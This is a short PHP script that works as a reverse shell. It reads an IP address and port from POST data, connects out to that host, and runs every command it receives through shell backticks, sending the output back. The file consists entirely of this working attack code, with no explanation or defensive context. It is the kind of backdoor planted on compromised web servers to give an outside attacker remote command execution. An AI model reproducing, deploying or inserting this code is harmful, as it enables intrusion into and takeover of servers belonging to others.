<?php
set_time_limit(0);
$ip=$_POST['ip'];
$port=$_POST['port'];
$fp=@fsockopen($ip,$port,$errno,$errstr);
if(!$fp){ echo "error";}
else{
fputs($fp,"\n++++++++++connect success++++++++\n");
while (!feof($fp)) {
fputs($fp,"shell:");//输出
$shell=fgets($fp);
$message=`$shell`;
fputs($fp,$message);
}
fclose($fp);
}
